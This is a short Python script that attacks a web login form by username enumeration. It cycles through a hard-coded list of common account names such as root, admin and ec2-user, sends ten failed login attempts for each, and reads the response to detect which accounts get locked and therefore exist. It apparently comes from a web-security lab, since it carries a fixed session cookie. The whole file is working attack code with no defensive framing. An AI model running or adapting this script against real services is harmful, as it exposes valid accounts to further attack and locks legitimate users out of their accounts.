
import requests
import time



url = input("Enter URL: ")

dict = [ 'root', 'admin', 'test', 'guest', 'info', 'adm', 'mysql', 'user', 'administrator', 'oracle', 'ftp', 'pi', 'puppet', 'ansible', 'ec2-user', 'vagrant', 'azureuser', 'academico', 'acceso', 'access', 'accounting', 'accounts', 'acid', 'activestat', 'ad', 'adam', 'adkit', 'admin', 'administracion', 'administrador', 'administrator', 'administrators', 'admins', 'ads', 'adserver', 'adsl', 'ae', 'af', 'affiliate', 'affiliates', 'afiliados', 'ag', 'agenda', 'agent', 'ai', 'aix', 'ajax', 'ak', 'akamai', 'al', 'app', 'app01', 'app1', 'apple', 'application', 'applications', 'apps', 'appserver', 'aq', 'ar', 'archie', 'arcsight', 'argentina', 'arizona', 'arkansas', 'arlington', 'as', 'as400', 'asia', 'asterix', 'at', 'athena', 'atlanta', 'atlas', 'att', 'au', 'auction', 'austin', 'auth', 'auto', 'autodiscover']
cookies = {'session' : 'qsswt2jq80je8B6OAuShQQLqVPq70f8J' }

for user in dict:
    for x in range(0, 10):
        payload = {'username' : user, 'password' : 'pass' }
        r = requests.post(url, data=payload, cookies=cookies)
        if (r.text.find('Invalid username or password.') != -1):
            print('not locked for ' + user)
        else:
            print("___________________________")
            print("...........................")
            print("The account has been locked")
            print(user)
            print("...........................")
            print("___________________________")

            printcheck = input("Would you like to see the full request?\n")

            if printcheck == "y":
                print(r.text)
                time.sleep(60)